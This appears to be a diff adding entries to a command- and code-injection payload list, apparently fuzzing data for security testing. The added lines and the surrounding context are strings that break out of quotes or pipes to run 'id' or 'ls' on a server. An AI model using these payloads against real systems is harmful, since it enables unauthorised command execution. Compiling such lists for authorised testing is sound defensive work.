@@ -77,6 +77,10 @@ a)|id
 a|id
 a)|id;
 a|id
+.print((`id`)).
+.print((`id`)).'
+'.print((`id`)).'`
+`&**='.print((`id`)).'`
 |/bin/ls -al
 a);/usr/bin/id
 a;/usr/bin/id
